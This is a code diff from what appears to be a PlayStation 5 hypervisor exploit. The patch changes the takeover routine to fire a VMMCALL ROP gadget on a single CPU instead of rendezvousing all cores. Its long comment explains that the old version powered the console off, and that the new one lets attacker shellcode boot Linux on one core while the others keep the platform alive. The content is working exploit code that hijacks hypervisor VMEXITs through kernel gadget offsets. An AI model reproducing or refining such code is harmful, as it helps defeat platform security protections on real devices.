@@ -104,12 +104,30 @@ void takeover(uint64_t ktext, uint64_t dmap)
       vme[i] = stub[i];
   }
 
-  /* Kick every CPU into a raw VMMCALL; each VMEXIT lands in shellcode_hv. */
-  void (*smp_rendezvous)(void *, void *, void *, void *) =
-      (void (*)(void *, void *, void *, void *))(uintptr_t)(ktext + OFF_FUN_SMP_RENDEZVOUS);
-  smp_rendezvous((void *)(uintptr_t)(ktext + OFF_GADGET_RET),
-                 (void *)(uintptr_t)(ktext + OFF_GADGET_VMMCALL),
-                 (void *)(uintptr_t)(ktext + OFF_GADGET_RET), 0);
+  /* VMMCALL on THIS cpu only, not on all sixteen.
+   *
+   * This used to be smp_rendezvous(), which sends an IPI to every core and makes
+   * each of them issue the VMMCALL. That takes all sixteen out of the PS5's kernel
+   * at once, and the platform reacts to a system with no running kernel the only
+   * way it can: it cuts the power. That is what the log shows - a deterministic
+   * power-off right after "takeover armed", with the park in shellcode_hv making no
+   * difference, because by then nothing of the PS5 is left to keep the EC happy.
+   *
+   * The design says the opposite in two places. HV_HEADLESS_SINGLE_CORE's comment in
+   * hv_defeat_1360.c says "the khook payload only runs on one core; tell Linux not
+   * to try to bring up the APs (which are still parked in the hypervisor)", and
+   * shellcode_hv's own barrier is skipped when that flag is set precisely because
+   * the other cores never arrive. Leaving fifteen cores running the PS5 is not a
+   * compromise here, it is the point: they are what the platform is watching.
+   *
+   * So: one VMMCALL, on the core that is running this blob. Its VMEXIT lands in
+   * shellcode_hv, which brings Linux up on that core alone, with " maxcpus=1 nosmp"
+   * on the command line. */
+  {
+    void (*vmmcall_gadget)(void *) =
+        (void (*)(void *))(uintptr_t)(ktext + OFF_GADGET_VMMCALL);
+    vmmcall_gadget((void *)0);
+  }
 
   for (;;)
     ;
